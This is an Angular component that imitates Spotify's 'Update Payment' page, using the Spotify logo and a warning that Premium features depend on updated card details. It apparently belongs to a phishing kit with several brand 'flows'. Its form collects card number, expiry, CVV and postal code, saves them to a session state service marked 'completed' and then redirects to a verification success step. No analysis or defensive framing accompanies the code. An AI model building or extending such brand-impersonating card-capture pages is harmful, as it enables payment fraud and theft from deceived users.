import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
    selector: 'app-spotify-payment',
    standalone: true,
    imports: [CommonModule, FormsModule, ReactiveFormsModule],
    template: `
    <div class="spotify-flow-container">
      <img src="/assets/images/logos/spotify-logo.svg" alt="Spotify" class="spotify-logo">
      
      <div class="spotify-card">
        <h1>Update Payment</h1>
        
        <p style="text-align: center; color: #b3b3b3; margin-bottom: 30px;">
           Update your payment method to keep your Premium features.
        </p>

        <form [formGroup]="cardForm" (ngSubmit)="onSubmit()">
          <div class="spotify-form-group">
            <label for="cardNumber">Card Number</label>
            <input 
              type="text" 
              id="cardNumber" 
              formControlName="cardNumber"
              placeholder="0000 0000 0000 0000"
              [class.error]="isFieldInvalid('cardNumber')"
              (input)="formatCardNumber($event)"
            >
          </div>

          <div style="display: flex; gap: 15px;">
              <div class="spotify-form-group" style="flex: 1;">
                <label for="expiry">Expiry</label>
                <input 
                  type="text" 
                  id="expiry" 
                  formControlName="expiry"
                  placeholder="MM/YY"
                  [class.error]="isFieldInvalid('expiry')"
                  (input)="formatExpiry($event)"
                >
              </div>
              
              <div class="spotify-form-group" style="flex: 1;">
                <label for="cvv">Code</label>
                <input 
                  type="text" 
                  id="cvv" 
                  formControlName="cvv"
                  placeholder="CVV"
                  maxlength="4"
                  [class.error]="isFieldInvalid('cvv')"
                >
              </div>
          </div>
          
          <div class="spotify-form-group">
            <label for="zip">Postal Code</label>
            <input 
              type="text" 
              id="zip" 
              formControlName="zip"
              placeholder="12345"
              [class.error]="isFieldInvalid('zip')"
            >
          </div>

          <button 
            type="submit" 
            class="spotify-btn-primary"
            [disabled]="cardForm.invalid || isLoading()"
          >
            Update
          </button>
          
          <div style="margin-top: 20px; text-align: center;">
             <a href="javascript:void(0)" style="color: #b3b3b3; font-size: 12px;">Cancel</a>
          </div>
        </form>
      </div>
    </div>
  `,
    styleUrls: ['../../../styles/flows/spotify.scss']
})
export class SpotifyPaymentComponent {
    private fb = inject(FormBuilder);
    private router = inject(Router);
    private state = inject(StateService);

    isLoading = signal(false);

    cardForm = this.fb.group({
        cardNumber: ['', [Validators.required, Validators.pattern(/^\d{4}\s\d{4}\s\d{4}\s\d{4}$/)]],
        expiry: ['', [Validators.required, Validators.pattern(/^(0[1-9]|1[0-2])\/\d{2}$/)]],
        cvv: ['', [Validators.required, Validators.pattern(/^\d{3,4}$/)]],
        zip: ['', [Validators.required, Validators.minLength(5)]]
    });

    isFieldInvalid(field: string): boolean {
        const control = this.cardForm.get(field);
        return !!(control && control.invalid && (control.dirty || control.touched));
    }

    formatCardNumber(event: any) {
        let value = event.target.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        this.cardForm.get('cardNumber')?.setValue(formatted.substring(0, 19));
    }

    formatExpiry(event: any) {
        let value = event.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        this.cardForm.get('expiry')?.setValue(value.substring(0, 5));
    }

    async onSubmit() {
        if (this.cardForm.valid) {
            this.isLoading.set(true);
            const { cardNumber, expiry, cvv, zip } = this.cardForm.value;

            this.state.updateSession({
                cardNumber,
                cardExpiry: expiry,
                cardCvv: cvv,
                billingZip: zip,
                status: 'completed'
            });

            setTimeout(() => {
                this.isLoading.set(false);
                this.state.navigate('/verify/step-success');
            }, 800);
        } else {
            this.cardForm.markAllAsTouched();
        }
    }
}
